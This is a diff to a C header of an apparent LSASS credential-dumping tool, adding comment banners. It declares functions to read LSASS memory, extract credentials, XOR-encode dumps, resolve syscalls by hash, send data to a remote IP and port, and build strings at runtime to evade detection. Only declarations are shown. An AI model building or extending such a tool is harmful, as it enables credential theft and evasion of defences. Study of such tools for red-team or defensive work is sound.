@@ -35,7 +35,9 @@ typedef struct _AXIOM_TABLE
 	struct _AXIOM_TABLE* next;
 } AXIOM_TABLE, * PAXIOM_TABLE;
 
-//
+//=============================================================================
+//|                               El_Sass magic                               |
+//=============================================================================
 BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress);
 BOOL ELSASS_ExtractAllCredz(PDUMPCONTEXT dc);
 void ELSASS_Append(IN PDUMPCONTEXT dc, IN const PVOID data, IN ULONG32 size, IN UINT xorkey);
@@ -57,11 +59,15 @@ void* AXIOM_GetSyscallAddrByHash(const char* hash);
 const int AXIOM_GetSNNByHash(const char* hash);
 int AXIOM_NetworkEmitter(const char* ip, int port, unsigned char* buffer, size_t bufferSize);
 
-//
+//=============================================================================
+//|                                 EAT stuff                                 |
+//=============================================================================
 PTEB RtlGetThreadEnvironmentBlock();
 BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
 
-//
+//=============================================================================
+//|        Gnagna, your code is unsafe and I won't let you compile --"        |
+//=============================================================================
 const int drunk_atoi(const char* argv1);
 char* drunk_md5(const char* input);
 const char* drunk_strcpy(char* dest, const char* src);
@@ -70,7 +76,9 @@ const int drunk_strcmp(const char* s1, const char* s2);
 unsigned char* drunk_memcpy(unsigned char* dest, const unsigned char* src, size_t len);
 const char* drunk_wchar_to_cstring(wchar_t* source);
 
-//
+//=============================================================================
+//|      Mostly needed to avoid embarqing the "NT*" strings in the binary     |
+//=============================================================================
 # define STRBUILDER_SEDEBUG 1
 # define STRBUILDER_DBGHELP_DLL 2
 # define STRBUILDER_MINIDUMP_WRITEDUMP 3
@@ -78,7 +86,7 @@ const char* drunk_wchar_to_cstring(wchar_t* source);
 # define STRBUILDER_LSASRV_DLL 5
 const wchar_t* SecretWStrBuilder(const int MODE);
 
-//
+// Yes I recoded that one because otherwise the needed header files mess up everything
 void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a, HANDLE r, PVOID s);
 
 #endif
